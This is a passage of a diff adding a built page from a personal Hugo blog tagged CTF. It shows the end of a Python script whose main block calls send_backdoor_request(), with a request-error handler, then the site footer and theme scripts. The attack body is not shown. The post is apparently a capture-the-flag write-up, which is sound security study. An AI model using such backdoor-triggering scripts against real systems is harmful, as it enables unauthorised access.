+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>RequestException <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] 请求错误: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    send_backdoor_request()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">0raN9e&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
